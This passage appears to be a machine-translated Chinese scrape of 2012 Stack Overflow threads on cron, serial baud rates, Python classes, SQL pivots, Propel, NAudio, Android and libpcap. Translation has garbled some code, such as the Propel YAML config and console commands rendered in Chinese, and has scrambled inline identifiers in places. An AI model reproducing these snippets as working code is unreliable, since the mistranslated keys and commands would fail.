For reference, entropy of completely random 8 character (very hard to memorize)
password of upper and lowercase letters plus numbers is 47.6 bits
Entropy of a typical human generated "strong" 8 character password is in the
ballpark of 20 - 30 bits.

Below is a list of 16 passphrases.
Assuming you select one of these based on some non random preference
your new passphrase will have entropy of 39.2 bits.

Note that first letter is always capitalized and spaces are
replaced with '1' to meet password requirements of many systems.

Goatees1maneuver1pods
Aught1fuel1hungers
Flavor1knock1foreman
Holding1holster1smarts
Vitamin1mislead1abhors
Proverbs1lactose1brat
... and so on 10 more 
```

还有一些基于浏览器/javascript 的工具：

*   [http://preshing.com/20110811/xkcd-password-generator](http://preshing.com/20110811/xkcd-password-generator)
*   [http://passphra.se/](http://passphra.se/)
*   [http://lightsecond.com/passphrase.html](http://lightsecond.com/passphrase.html)

CPAN 拥有一个 Perl 模块，用于生成 XKCD 风格的密码：

*   [http://metacpan.org/pod/Crypt::XkcdPassword](http://metacpan.org/pod/Crypt%3a%3aXkcdPassword)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T21:13:09.177

我最近在 GitHub 上`gen-password`发布[了](https://github.com/Keith-S-Thompson/random-passwords)几个 Perl 脚本。`gen-passphrase`

该`gen-passphrase`脚本可以满足您的需求。它需要三个参数：用作首字母序列的单词、最小长度和最大长度。例如：

```
$ gen-passphrase abcde 6 8
acrimony borrowed chasten drifts educable 
```

或者你可以要求一些单词而不指定它们的首字母（我刚刚添加的一个新功能）：

```
$ gen-passphrase 5 6 8
poplin outbreak aconites academic azimuths 
```

它需要一个单词列表；`/usr/share/dict/words`如果存在，它默认使用。它`/dev/urandom`默认使用，但可以被告知使用`/dev/random`. 有关vs.的更多信息，请参阅我在 superuser.com 上的[答案](https://superuser.com/a/359601/92954)。`/dev/urandom``/dev/urandom`

**注意：**到目前为止，除了我之外，没有人测试过这些脚本。我已尽最大努力让他们生成强密码/密码，但我不保证。

# linux - 关于 Cron 的困惑

> ID：12646321
> 
> 赞同：-1
> 
> 时间：2012-09-28T19:39:20.147
> 
> 标签：linux, unix, cron, crontab, aix

这是我第一次为 cron 作业编写脚本。

我在 shell 中编写了我的代码（它可以工作），我正在尝试为 cron 设置它。所以这是我的问题。如何设置 cron？我想在 `10 * * * * /home/workstation/deleter.sh`下面写（我希望它每 10 分钟运行一次）`#!/bin/sh`吗？我将如何执行它？（deleter.sh 已通过 chmod 获得许可） man 1 crontab 返回“手册第 1 节中没有 crontab 条目”我现在真的很迷茫和困惑。如果有人知道如何设置 cron 请告诉我！！

提前致谢

```
#!/bin/sh

counter=0
logloc=/home/ServerLogs
backup=/home/test
## Reads the location of the file systems that needs to be investigated from location.txt
## and save it into an array
while read -r line; do
   Unix_Array[${counter}]=$line;
   let counter=counter+1;
done < location.txt
## Reads Email recipients and save it into an array
More code continues from here...... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:51:17.413

以下将打开您环境的文本编辑器并加载 crontab：

```
crontab -e 
```

您的 crontab 条目大部分是正确的。为了让您的脚本每十分钟运行一次，它应该更改为：

```
*/10 * * * * /home/workstation/deleter.sh 
```

您指定的条目将在每小时的第 10 分钟运行脚本。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T19:47:21.540

这可能会有所帮助

[http://www.manpagez.com/man/5/crontab/](http://www.manpagez.com/man/5/crontab/)

你需要进入你的 crontab

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T19:47:32.927

要设置 cron，您可以做两件（主要）事情之一。第一个是将指定的行放在`/etc/crontab`. 第二个是运行`crontab -e`并将线路放在那里。我建议使用`crontab -e`这样 cron 将作为您自己的用户帐户执行。

如果脚本的完整路径是`/home/workstation/deleter.sh`并且它*确实*具有执行权限，正如您所指定的 - 您的当前行将让它每小时执行 10 分钟。要让它每 10 分钟执行一次，您必须使用`*/10`，如下所示：

```
*/10 * * * * /home/workstation/deleter.sh 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-02T16:27:36.693

我第一次了解 cron 时遇到的最佳链接之一！收藏它

[http://www.thegeekstuff.com/2009/06/15-practical-crontab-examples/](http://www.thegeekstuff.com/2009/06/15-practical-crontab-examples/)

# linux - 如何在 Linux 上设置自定义波特率？

> ID：12646324
> 
> 赞同：39
> 
> 时间：2012-09-28T19:39:27.183
> 
> 标签：linux, serial-port, baud-rate

我想通过我在 Linux 上的串行端口与具有未在`termios.h`.

[我尝试了这篇文章](https://stackoverflow.com/a/7152671/1707026)中的“波特率别名”方法，但是当我执行我的 C 程序（我将其命名为“testprogram”）时，Linux 说`"testprogram sets custom speed on ttyS0\. This is deprecated."`

我在 Google 上进行了一些搜索，似乎还有另一种（更新的？）方法可以将波特率更改为非标准值：在[http://sourceware.org/ml/libc-help/2009-06 /msg00016.html](http://sourceware.org/ml/libc-help/2009-06/msg00016.html)作者说`c_flag`of`struct termios`必须与`BOTHER (=CBAUDEX | B0)`.

使用这种方法，波特率直接在 . 的`c_ispeed`和`c_ospeed`- 成员中设置`struct termios`。但是，我不知道如何在我的 C 程序中使用这种方法。就像作者说的，当我包含时没有`BOTHER`定义/可用`termios.h`，那么应该怎么做才能以这种方式设置波特率呢？

如何在不更改内核的情况下将波特率设置为非标准值？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2013-11-15T02:32:40.257

我注意到关于 BOTHER 没有被定义的同样的事情。正如 Jamey Sharp 所说，您可以在`<asm/termios.h>`. 只是一个警告，我想我同时遇到了包括它和常规`<termios.h>`文件在内的问题。

除此之外，我发现我拥有的 glibc 仍然无法正常工作，因为 glibc 的 tcsetattr 正在为不注意速度设置的旧式 struct termios 版本执行 ioctl。我可以通过使用新样式 termios2 结构手动执行 ioctl 来设置自定义速度，该结构也应该可以通过包括`<asm/termios.h>`：

```
struct termios2 tio;

ioctl(fd, TCGETS2, &tio);
tio.c_cflag &= ~CBAUD;
tio.c_cflag |= BOTHER;
tio.c_ispeed = 12345;
tio.c_ospeed = 12345;
ioctl(fd, TCSETS2, &tio); 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2012-12-11T11:33:31.213

`stty`您可以使用Linux 上的命令设置自定义波特率。例如，要在串行端口 /dev/ttyX0 上设置自定义波特率 567890，请使用以下命令：

```
stty -F /dev/ttyX0 567890 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-02-22T20:49:50.933

[dougg3 几乎有这个](https://stackoverflow.com/questions/12646324/how-can-i-set-a-custom-baud-rate-on-linux/19992472#19992472)（我不能在那里发表评论）。您需要了解的主要附加事项是不相互冲突但确实提供正确原型的标题。答案是

```
#include <stropts.h>
#include <asm/termios.h> 
```

之后，您可以使用 dougg3 的代码，最好在 ioctl() 调用中进行错误检查。您可能需要将其放在一个单独的 .c 文件中，以用于使用普通 termios 设置其他参数的串行端口代码的其余部分。首先进行 POSIX 操作，然后设置自定义速度，在 Raspberry Pi 的内置 UART 上工作正常，以获得 250k 波特率。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-05T06:39:12.403

`BOTHER`似乎可以`<asm/termios.h>`在 Linux 上使用。从那里提取定义将是非常不可移植的，但我认为这个 API 无论如何都是不可移植的，所以它可能没有什么大的损失。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-11-19T21:58:18.593

对于 Mac 用户（可能也适用于某些[Linux 发行版](http://en.wikipedia.org/wiki/Linux_distribution)）

```
stty ospeed 999999

stty ispeed 999999 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-02-04T10:38:41.677

您可以只使用普通的 termios 标头和普通的 termios 结构（使用标头 asm/termios 时与 termios2 相同）。

因此，您使用 open() 打开设备并获取文件描述符，然后使用它`tcgetattr()`来填充您的 termios 结构。

然后清除并 `CBAUD`设置`CBAUDEX`。与 BOTHER 具有相同的值。`c_cflag``CBAUDEX`

设置后，您可以使用普通函数设置自定义波特率，例如`cfsetspeed()`，将所需的波特率指定为整数。

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2012-12-14T06:56:56.767

主板的 CPU ( [16650 UART](https://en.wikipedia.org/wiki/16550_UART) ) 上有一个串行 I/O 芯片。该芯片使用8位端口作为控制和数据总线，因此您可以通过控制和数据总线向该芯片写入命令来向它发出命令。

通常，应用程序在串行端口上执行以下步骤

1.  在程序启动期间设置波特率、奇偶校验、编码、流控制和开始/结束序列长度。此设置可以通过 ioctl 到串行设备或“stty”命令来完成。事实上，stty 命令对那个串行设备使用 ioctl。
2.  将数据字符写入串行设备，驱动程序将通过其 8 位数据总线将数据字符写入 UART 芯片。

简而言之，您可以只在 STTY 命令中指定波特率，然后将所有其他选项保持为默认值，并且足以连接到其他设备。

# python - 在 __init__ 中调用类函数

> ID：12646326
> 
> 赞同：181
> 
> 时间：2012-09-28T19:40:05.263
> 
> 标签：python, class

我正在编写一些带有文件名、打开文件并解析出一些数据的代码。我想在课堂上做这个。以下代码有效：

```
class MyClass():
    def __init__(self, filename):
        self.filename = filename 

        self.stat1 = None
        self.stat2 = None
        self.stat3 = None
        self.stat4 = None
        self.stat5 = None

        def parse_file():
            #do some parsing
            self.stat1 = result_from_parse1
            self.stat2 = result_from_parse2
            self.stat3 = result_from_parse3
            self.stat4 = result_from_parse4
            self.stat5 = result_from_parse5

        parse_file() 
```

但这涉及到我将所有的解析机制都放在`__init__`我班级的函数范围内。对于这个简化的代码，现在看起来不错，但是该函数`parse_file`也有很多缩进级别。我更喜欢将函数定义`parse_file()`为类函数，如下所示：

```
class MyClass():
    def __init__(self, filename):
        self.filename = filename 

        self.stat1 = None
        self.stat2 = None
        self.stat3 = None
        self.stat4 = None
        self.stat5 = None
        parse_file()

    def parse_file():
        #do some parsing
        self.stat1 = result_from_parse1
        self.stat2 = result_from_parse2
        self.stat3 = result_from_parse3
        self.stat4 = result_from_parse4
        self.stat5 = result_from_parse5 
```

当然这段代码不起作用，因为函数`parse_file()`不在函数的范围内`__init__`。有没有办法从该类中调用类函数`__init__`？还是我想错了？

* * *

## 回答 #1

> 赞同：252
> 
> 时间：2012-09-28T19:45:30.300

以这种方式调用函数：

```
self.parse_file() 
```

您还需要`parse_file()`像这样定义您的函数：

```
def parse_file(self): 
```

该`parse_file`方法必须在调用它时绑定到一个对象（因为它不是静态方法）。这是通过在对象的实例上调用函数来完成的，在您的情况下，实例是`self`.

* * *

## 回答 #2

> 赞同：45
> 
> 时间：2012-09-28T19:45:59.360

如果我没记错的话，这两个函数都是你的类的一部分，你应该像这样使用它：

```
class MyClass():
    def __init__(self, filename):
        self.filename = filename 

        self.stat1 = None
        self.stat2 = None
        self.stat3 = None
        self.stat4 = None
        self.stat5 = None
        self.parse_file()

    def parse_file(self):
        #do some parsing
        self.stat1 = result_from_parse1
        self.stat2 = result_from_parse2
        self.stat3 = result_from_parse3
        self.stat4 = result_from_parse4
        self.stat5 = result_from_parse5 
```

替换你的行：

```
parse_file() 
```

和：

```
self.parse_file() 
```

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2012-09-28T19:45:50.170

怎么样：

```
class MyClass(object):
    def __init__(self, filename):
        self.filename = filename 
        self.stats = parse_file(filename)

def parse_file(filename):
    #do some parsing
    return results_from_parse 
```

顺便说一句，如果你有名为`stat1`,`stat2`等的变量，情况就是在乞求一个元组： `stats = (...)`。

所以让我们`parse_file`返回一个元组，并将元组存储在 `self.stats`.

然后，例如，您可以访问以前`stat3`使用`self.stats[2]`.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-28T19:47:30.563

您必须像这样声明 parse_file；`def parse_file(self)`. “self”参数在大多数语言中是隐藏参数，但在 python 中不是。您必须将它添加到属于某个类的所有方法的定义中。然后你可以使用类中的任何方法调用该函数`self.parse_file`

您的最终程序将如下所示：

```
class MyClass():
  def __init__(self, filename):
      self.filename = filename 

      self.stat1 = None
      self.stat2 = None
      self.stat3 = None
      self.stat4 = None
      self.stat5 = None
      self.parse_file()

  def parse_file(self):
      #do some parsing
      self.stat1 = result_from_parse1
      self.stat2 = result_from_parse2
      self.stat3 = result_from_parse3
      self.stat4 = result_from_parse4
      self.stat5 = result_from_parse5 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-28T19:47:06.593

在`parse_file`中，取`self`参数（就像在 中一样`__init__`）。如果您需要任何其他上下文，则只需像往常一样将其作为附加参数传递。

* * *

## 回答 #6

> 赞同：-16
> 
> 时间：2012-09-28T19:44:59.067

我认为你的问题实际上是没有正确缩进**init**函数。应该是这样的

```
class MyClass():
     def __init__(self, filename):
          pass

     def parse_file():
          pass 
```

# postgresql - 内存中的数据与数据库元组中的数据的典型大小是多少？

> ID：12646329
> 
> 赞同：2
> 
> 时间：2012-09-28T19:40:13.737
> 
> 标签：postgresql, caching, geospatial, openstreetmap, distributed-caching

我正在开发一个在本地服务器中使用 Openstreetmap 数据的应用程序。为了提高在 OSM 数据库中的搜索速度，我正在考虑在 RAM 内存（也就是我的应用程序的 Java 堆）中缓存一些数据。我想确定缓存不同数量的数据将消耗多少 RAM。完整的数据文件大约有 330 个演出，并且还在不断增长。这将在内存中转换为多少内存？一般来说，有没有办法知道 postgres 数据库中每个 gig 数据会消耗多少 RAM（如果缓存在数据库之外）？

谢谢各位。

萨钦

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:58:33.163

内存中的表示通常比磁盘上的表示需要*更多的空间。*它取决于所涉及的数据类型，并且可能在因子 2 左右。

更多信息[请参阅 Tom Lane 和 Ondrej Ivanic 的 pgsql-general 主题](http://archives.postgresql.org/pgsql-general/2011-08/msg00825.php)。

那是 PostgreSQL 本身使用的内存。不确定问题的“数据库外部”部分。你是说磁盘缓存？操作系统缓存？不知道那里会有什么因素。

# php - 在命令行上给出的文件名

> ID：12646334
> 
> 赞同：0
> 
> 时间：2012-09-28T19:40:37.483
> 
> 标签：php

我想从命令行读取文件名而不是使用`file_get_contents("filename.txt");` 命令。

我想从命令行读取文件并将输出文件以输入文件和输出文件的形式放在同一个`php myprog.php 1 input.txt output.txt` 地方（命令行） 。`input.txt``output.txt`

我可以在这个地方使用哪个功能？

需要一些帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T19:43:46.100

使用`$argv`- 它是从命令行运行时传递给脚本的所有参数的数组。然后，您可以遍历它并根据数组键的计数、值做任何您需要做的事情。

```
<?php
   var_dump($argv);
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:44:14.347

传递给 PHP 脚本的命令行选项（它本身作为命令行参数传递给 PHP 解释器，因此它只是将参数打包以供脚本使用）[在`$argv`数组](http://php.net/manual/en/features.commandline.php)中找到。

# sql - Oracle 11G R2 SQL 行到列

> ID：12646342
> 
> 赞同：0
> 
> 时间：2012-09-28T19:41:19.130
> 
> 标签：sql, oracle, pivot, oracle11gr2

我有一张银行员工信息表，如下所示：

```
branchNumber    Position    firstName    lastName    staffNumber
------------    --------    ---------    --------    -----------
25              Manager     john         doe         11111
25              Secretary   robert       paulson     11112
25              Secretary   cindy        lu          11113
66              Manager     tim          timson      22223
66              Manager     jacob        jacobson    22224
66              Secretary   henry        henryson    22225
66              Supervisor  paul         paulerton   22226 
```

这个其实我已经完成了，但是我使用SQL公用表表达式完成了赋值，在这个项目中不能使用，我需要这种格式。

```
branchNumber    numOfManagers    numOfSecretaries    numOfSupervisors    totalEmployees
------------    -------------    ----------------    ----------------    --------------
25                    1                 2                   0                   3
66                    2                 1                   1                   4 
```

我的问题是从一行中获取多列信息，到目前为止我有这个，

```
SELECT branchNumber, COUNT(*) AS numOfManagers
FROM Staff
WHERE position = 'Manager'
GROUP BY branchNumber, Position; 
```

这会为 numOfManagers 输出正确的信息，但是在不使用 CTE 的情况下制作接下来的三列让我难以理解。我也尝试了子选择，但没有运气。有人有什么想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-28T19:46:30.123

你可以使用这样的东西：

```
select branchnumber,
  sum(case when Position ='Manager' then 1 else 0 end) numofManagers,
  sum(case when Position ='Secretary' then 1 else 0 end) numofSecretaries,
  sum(case when Position ='Supervisor' then 1 else 0 end) numofSupervisors,
  count(*) totalEmployees
from yourtable
group by branchnumber 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!4/69a0d/1)

或者您可以使用以下[`PIVOT`](http://www.oracle.com/technetwork/articles/sql/11g-pivot-097235.html)功能：

```
select branchnumber,
  'Manager', 'Secretary', 'Supervisor',
  TotalEmployees
from
(
  select t1.branchnumber,
    t1.position,
    t2.TotalEmployees
  from yourtable t1
  inner join
  (
    select branchnumber, count(*) TotalEmployees
    from yourtable
    group by branchnumber
  ) t2
    on t1.branchnumber = t2.branchnumber
) x
pivot
(
  count(position)
  for position in ('Manager', 'Secretary', 'Supervisor')
) p; 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!4/69a0d/10)

# symfony - Propel - Symfony2：必须定义 propel.path。依赖注入\异常

> ID：12646343
> 
> 赞同：1
> 
> 时间：2012-09-28T19:41:23.967
> 
> 标签：symfony, propel

在 CLI 上运行此命令：

> php 应用程序/控制台推进：构建

拿到

> [Symfony\Component\DependencyInjection\Exception\InvalidArgumentException] 必须定义参数“propel.path”。

在 app/config/config.yml 我已经：

```
    推进：
        路径：“%kernel.root_dir%/../vendor/propel”
        phing_path: "%kernel.root_dir%/../vendor/phing"
        日志记录：%kernel.debug%
        ...

```

我正在遵循[使用 Symfony2](http://www.propelorm.org/cookbook/symfony2/working-with-symfony2.html)中的 PropelBundle 安装说明并通过 composer 安装。

系统信息：

```
Apache/2.2.22 (Win64) PHP/5.3.13
“名称”：“phing/phing”，
            “版本”：“2.4.12”，
“名称”：“推进/推进捆绑”，
            “版本”：“1.1.x-dev”，
“名称”：“推进/推进1”，
            “版本”：“开发大师”，
"name": "sensio/generator-bundle",
            “版本”：“2.1.x-dev”，
"name": "symfony/symfony",
            “版本”：“2.1.x-dev”，

Wamp 服务器 2.2 版

WIN7 64

```

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-29T03:45:39.117

## 解决了

缓存是问题所在。在发布此问题之前，我尝试使用以下方法清除它：

> php 应用程序/控制台缓存：清除

但是应用程序控制台无法清除，因为他的 Container 是使用相同的缓存损坏参数制作的。所以（两个小时后头痛）**我只是手动删除了 app/cache/dev 中的所有内容**，现在一切正常。为一件愚蠢的事情而头疼。

感谢 prodigitalson 的帮助。

希望这篇文章对某人有所帮助。

# c# - 在 C# 中使用 NAUDIO 分析 WAVE 文件中的数据块

> ID：12646344
> 
> 赞同：2
> 
> 时间：2012-09-28T19:41:27.047
> 
> 标签：c#, wav, naudio, waveform

我想从 .wav 文件中画出一小段波形到屏幕上。这是我到目前为止创建的代码：

```
 NAudio.Wave.WaveFileReader wave = new NAudio.Wave.WaveFileReader(@"C:\test.wav");
      long le = wave.Length;
      byte[] data = new byte[le];

      wave.Read(data, 0, (int)le);

      for (int i = 0; i < 100; i++)
      {
            System.Console.WriteLine(data[i]);
      }

      System.Console.ReadKey(); 
```

我只是试图获取数据块的前 100 个样本，但我不完全理解结果。这些数字是语音波的幅度值吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T21:44:23.620

您的 WAV 文件很可能是 16 位的（您可以通过查看 WaveFileReader 的 WaveFormat 属性并查看 BitDepth 来检查这一点）。在这种情况下，每两个字节代表一个样本。您可以使用`BitConverter.ToInt16`来一一检查每个样本的值。因此，例如，您可以将代码修改为如下所示：

```
 NAudio.Wave.WaveFileReader wave = new NAudio.Wave.WaveFileReader(@"C:\test.wav");
  byte[] data = new byte[200];

  int read = wave.Read(data, 0, data.Length);

  for (int i = 0; i < read; i+=2)
  {
        System.Console.WriteLine(BitConverter.ToInt16(data,i));
  }

  System.Console.ReadKey(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:56:19.380

它们是幅度，但每个通道的“幅度”每秒变化 44100 次。

试试这篇文章：[http ://en.wikipedia.org/wiki/Pulse-code_modulation](http://en.wikipedia.org/wiki/Pulse-code_modulation)

如果失败，请记住这一点。声音是气压的变化。气压变化是由扬声器通过电压变化产生的。电压变化是通过快速激活数模转换器上的各种输入电平产生的。输入电平（数字）是您从文件中读取 PCM 数据时得到的。

# javascript - 单击jqGrid单元格时滚动跳转

> ID：12646350
> 
> 赞同：2
> 
> 时间：2012-09-28T19:42:09.977
> 
> 标签：javascript, jquery, jqgrid

我有一个相当宽的 jqGrid 设置，因此水平滚动条是可见的。

问题是，当向右滚动并单击单元格时，滚动条会一直跳回左侧。

任何想法为什么会发生这种情况以及如何防止它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2021-05-19T14:00:26.363

我和jqGrid4.1.2也有同样的问题 试了这么多方法，终于找到了解决办法

制作网格后，请执行以下操作：

1.  调用jqGrid的GridNav函数 `jQuery('#id').jqGrid('GridNav');`
2.  然后添加 gridId_kn 元素的父属性的位置：`position:fixed` 如果尚未添加位置，则设置 `jQuery('#id_kn').parent().attr("style", style+"position:fixed");`

# android - 代码中的Android ImageView setImageResource

> ID：12646354
> 
> 赞同：27
> 
> 时间：2012-09-28T19:42:42.777
> 
> 标签：android, imageview, android-resources

我有一个 imageView，我想显示您当前所在国家的一个小图标。我可以获得国家代码，但问题是我无法动态更改 imageView 资源。我的图片文件都是小写的（例如：国家代码=US，图片文件=us）

我的代码（countryCode 是大写字母的当前 countryCode）：

```
String lowerCountryCode = countryCode.toLowerCase();
String resource = "R.drawable." + lowerCountryCode;
img.setImageResource(resource); 
```

现在，这当然行不通，因为`setImageResource`想要一个`int`，所以我该怎么做呢？

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-09-28T19:54:07.363

`int`将您必须在该方法中使用的国家名称映射到一个简单的`setImageResource`方法是：

```
int id = getResources().getIdentifier(lowerCountryCode, "drawable", getPackageName());
setImageResource(id); 
```

但是您真的应该尝试为您想要支持的国家/地区使用不同的文件夹资源。

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2014-04-24T00:14:05.797

这是`ImageView`使用[**setImageResource()**](https://developer.android.com/reference/android/widget/ImageView.html#setImageResource(int))方法设置图像的方法：

```
ImageView myImageView = (ImageView)v.findViewById(R.id.img_play);
// supossing to have an image called ic_play inside my drawables.
myImageView.setImageResource(R.drawable.ic_play); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-05T08:56:55.600

你使用那个代码

```
ImageView[] ivCard = new ImageView[1];

@override    
protected void onCreate(Bundle savedInstanceState)  

ivCard[0]=(ImageView)findViewById(R.id.imageView1); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-09-24T19:09:18.167

您可以使用以下代码：

```
// Create an array that matches any country to its id (as String):
String[][] countriesId = new String[NUMBER_OF_COUNTRIES_SUPPORTED][];

// Initialize the array, where the first column will be the country's name (in uppercase) and the second column will be its id (as String):
countriesId[0] = new String[] {"US", String.valueOf(R.drawable.us)};
countriesId[1] = new String[] {"FR", String.valueOf(R.drawable.fr)};
// and so on...

// And after you get the variable "countryCode":
int i;
for(i = 0; i<countriesId.length; i++) {
   if(countriesId[i][0].equals(countryCode))
      break;
}
// Now "i" is the index of the country

img.setImageResource(Integer.parseInt(countriesId[i][1])); 
```

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-09-28T19:48:44.657

你可以试试这个：-

```
myImgView.setImageDrawable(getResources().getDrawable(R.drawable.image_name)); 
```

# android - 如何在默认的android示例中移动opengl三角形？

> ID：12646356
> 
> 赞同：0
> 
> 时间：2012-09-28T19:42:43.603
> 
> 标签：android, opengl-es-2.0

我正在使用默认的 android 示例代码 [http://developer.android.com/training/graphics/opengl/touch.html](http://developer.android.com/training/graphics/opengl/touch.html) 在此示例中，我们可以通过 toucht 事件旋转三角形。

我只想添加 x,y 轴的运动以进行测试。三角形行为并不像我预期的那样。我做错了什么？

教程中的代码突出显示了我的新行：

```
public void onDrawFrame(GL10 unused) {

        // Draw background color
        GLES20.glClear(GLES20.GL_COLOR_BUFFER_BIT);

        // Set the camera position (View matrix)
        Matrix.setLookAtM(mVMatrix, 0, 0, 0, -3, 0f, 0f, 0f, 0f, 1.0f, 0.0f);

        // Calculate the projection and view transformation
        Matrix.multiplyMM(mMVPMatrix, 0, mProjMatrix, 0, mVMatrix, 0);

        // Draw square
        mSquare.draw(mMVPMatrix);

       **//Translating this matrix 'brakes' triangle
  ->      Matrix.translateM(mMVPMatrix, 0, 0, pos, -1.0f);

        //NOTHING happens here: ??? Why?
  ->      Matrix.translateM(mRotationMatrix, 0, pos, 0, -1.0f);**

        // Create a rotation for the triangle
        // long time = SystemClock.uptimeMillis() % 4000L;
        // float angle = 0.090f * ((int) time);
        Matrix.setRotateM(mRotationMatrix, 0, mAngle, 0, 0, -1.0f);

        // Combine the rotation matrix with the projection and camera view
        Matrix.multiplyMM(mMVPMatrix, 0, mRotationMatrix, 0, mMVPMatrix, 0);

        // Draw triangle
        mTriangle.draw(mMVPMatrix);
    } 
```

默认行为：

![在此处输入图像描述](../Images/3e0fff8f03da77adcaa97ccf3a9cee3b.png)

用我的代码：

![在此处输入图像描述](../Images/26026802b31eaaa9fd5817d2c40e4732.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-28T16:23:51.887

感谢**icrev**评论：

您无法对 MVP 矩阵进行平移/旋转/缩放并获得预期的结果。

您必须在模型矩阵中平移/旋转对象（或在视图矩阵中进行相机平移/旋转）。

看看这个[模型视图投影矩阵的目的，](https://stackoverflow.com/questions/5550620/the-purpose-of-model-view-projection-matrix) 以更好地理解你需要做什么

这些是步骤：

1.  将 M 矩阵设置为单位矩阵。平移或旋转它。注意万向节锁 (en.wikipedia.org/wiki/Gimbal_lock)

2.  设置 V 矩阵 Matrix.setLookAtM(mVMatrix, 0, 0, 0, -3, 0f, 0f, 0f, 0f, 1.0f, 0.0f); 3.您已经有投影矩阵（在您的情况下为 mProjMatrix）

    4.  乘 M * V * P 得到最终的 MVP 矩阵

# networking - 使用 libpcap 时数据包长度不匹配

> ID：12646359
> 
> 赞同：2
> 
> 时间：2012-09-28T19:42:45.540
> 
> 标签：networking, network-programming, wireshark, libpcap, tcpdump

我正在使用`libpcap`. 我正在计算[此处](http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&ved=0CCIQFjAA&url=http://www.tcpdump.org/sniffex.c&ei=iGRlUP6WLIrW9QTXyIHQCw&usg=AFQjCNG06vPZLcb_gnMas5sM1m7uu5K53A&sig2=VKvPBo3Qicjw1cNg1Dn3QA) `size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);`
给出的有效负载大小 现在，对于一个数据包，`size_payload`是 1228，以太网报头是 14 字节，IP 报头是 20 字节，TCP 报头是 32 字节。而`header.caplen`和`header.len`是 1514 字节。不`size_payload+size_ip+size_tcp+size_ethernet`应该等于`header.caplen`？此外，当我使用 tcpdump 转储相同的数据包时，捕获长度显示为`1514`. 为什么这些不同？我期望`ntohs(ip->ip_len)`等于`header.caplen`和`header.len`

**编辑**
我希望`ntohs(ip->ip_len)`等于`header.caplen`and `header.len`。但我发现的`ntohs(ip->ip_len) = 1280`是`header.caplen = header.len = 1514`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:44:38.087

*表示可以*`caplen`捕获多少数据包，不一定实际捕获多少。您需要将该值与该字段进行比较。*`len`*

 *如果`caplen >= len`你知道你应该有整个数据包内容可用。否则，数据包捕获已被截断。*

# html - 使用 CSS3 形状作为居中背景

> ID：12646362
> 
> 赞同：0
> 
> 时间：2012-09-28T19:43:05.827
> 
> 标签：html, css

我想让我的 UL 有半个三角形作为背景。我真的很想在这个项目中只使用 CSS 形状。我已经使用了这个[站点](http://css-tricks.com/examples/ShapesOfCSS/)的一些代码，但是我需要一些额外的帮助。我无法让文本以形状为中心。我可以调整什么来实现这一点？

代码：http: [//jsfiddle.net/akAh9/](http://jsfiddle.net/akAh9/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:52:58.760

交换

```
right: 6em; 
```

... 为了 ...

```
right: 50%; 
```

... 似乎可以解决问题（这样您就可以有效地将 CSS 三角形的下点移动到`.diamond`元素的中间）。

# android - 运行服务时唤醒锁定

> ID：12646369
> 
> 赞同：0
> 
> 时间：2012-09-28T19:43:43.360
> 
> 标签：android, service, android-wake-lock

我只是想知道这是实现唤醒锁定以使我的设备在进入睡眠模式后重新启动的正确方法。设备重新启动后，它将从该点启动一个意图。真的，我只是想让屏幕显示足够长的时间以实现意图。如果不是指针会很棒，我这样做是否正确！

```
public class GMeter extends Service implements SensorEventListener {

private float mLastX, mLastY, mLastZ;
private boolean mInitialized;
private SensorManager mSensorManager;
private Sensor mAccelerometer;
private final float NOISE = (float) 2.0;
private PowerManager.WakeLock wl;

/** Called when the activity is first created. */
public void onCreate() {
    mInitialized = false;
    mSensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
    mAccelerometer = mSensorManager
            .getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
    mSensorManager.registerListener(this, mAccelerometer,
            SensorManager.SENSOR_DELAY_NORMAL);
    Toast.makeText(this, "Starting Service", Toast.LENGTH_LONG).show();
}

@Override
public int onStartCommand(Intent intent, int flags, int startId) {
    return START_STICKY;
}

@Override
public void onAccuracyChanged(Sensor arg0, int arg1) {
    // TODO Auto-generated method stub

}

@Override
public void onSensorChanged(SensorEvent event) {
    float x = event.values[0];
    float y = event.values[1];
    float z = event.values[2];
    double a = Math.sqrt(Math.pow(x, 2) + Math.pow(y, 2));
    double currentG = (a / SensorManager.STANDARD_GRAVITY);
    if (!mInitialized && currentG > 0.5) {
        AlertDialog alert = new AlertDialog.Builder(GMeter.this).create();
        alert.setTitle("-=Warning=-");
